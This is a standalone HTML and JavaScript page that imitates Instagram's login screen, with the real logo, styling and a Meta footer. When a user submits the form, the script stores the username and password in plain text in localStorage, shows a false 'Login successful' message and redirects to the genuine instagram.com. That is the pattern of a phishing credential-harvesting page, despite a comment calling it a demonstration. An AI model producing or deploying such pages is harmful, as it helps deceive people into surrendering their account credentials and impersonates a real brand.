<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 20px;
      width: 350px;
      text-align: center;
      margin-bottom: 10px;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      width: 175px;
      height: auto;
    }
    .input-field {
      width: 100%;
      padding: 9px 8px 7px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 12px;
      box-sizing: border-box;
    }
    .input-field:focus {
      border-color: #a8a8a8;
      outline: none;
    }
    .btn {
      width: 100%;
      background-color: #0095f6;
      color: white;
      border: none;
      padding: 7px;
      margin-top: 14px;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      font-size: 14px;
      opacity: 0.7;
      transition: opacity 0.2s, background-color 0.2s;
    }
    .btn.active {
      opacity: 1;
    }
    .btn:hover {
      background-color: #007edb;
    }
    .message {
      margin: 15px 0;
      color: #ed4956;
      font-size: 14px;
      min-height: 20px;
    }
    .footer {
      margin: 20px 0;
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 12px;
      color: #262626;
    }
    .password-container {
      position: relative;
      margin: 6px 0;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
  </div>
  <form id="login-form">
    <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required>
    <div class="password-container">
      <input type="password" id="password" class="input-field" placeholder="Password" required>
      <span class="toggle-password" onclick="togglePassword()">Show</span>
    </div>
    <button type="submit" class="btn" id="login-btn" disabled>Log In</button>
  </form>
  <div id="message" class="message"></div>
</div>

<div class="footer">
  Â© 2025 Instagram from Meta
</div>

<script>
// Form validation
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');

function validateForm() {
  if(usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
    loginBtn.classList.add('active');
    loginBtn.disabled = false;
  } else {
    loginBtn.classList.remove('active');
    loginBtn.disabled = true;
  }
}

usernameInput.addEventListener('input', validateForm);
passwordInput.addEventListener('input', validateForm);

// Password visibility toggle
function togglePassword() {
  const passwordField = document.getElementById('password');
  const toggleBtn = document.querySelector('.toggle-password');
  
  if(passwordField.type === 'password') {
    passwordField.type = 'text';
    toggleBtn.textContent = 'Hide';
  } else {
    passwordField.type = 'password';
    toggleBtn.textContent = 'Show';
  }
}

// Form submission
document.getElementById('login-form').addEventListener('submit', function(event) {
  event.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();
  const message = document.getElementById('message');

  // Basic validation
  if(username === '' || password === '') {
    message.textContent = 'Please fill in all fields';
    return;
  }

  // For demonstration only - in real app, NEVER store passwords like this
  let savedData = JSON.parse(localStorage.getItem('loginData')) || [];
  savedData.push({ 
    username: username, 
    password: password, // WARNING: This is unsafe in production
    timestamp: new Date().toISOString()
  });
  
  localStorage.setItem('loginData', JSON.stringify(savedData));
  
  // Show success message
  message.style.color = 'green';
  message.textContent = "Login successful! Redirecting...";
  
  // Clear inputs
  usernameInput.value = "";
  passwordInput.value = "";
  loginBtn.classList.remove('active');
  loginBtn.disabled = true;

  // Redirect after delay (simulating authentication)
  setTimeout(() => {
    window.location.href = "https://instagram.com";
  }, 1500);
});

// Initialize form validation
validateForm();
</script>

</body>
</html>
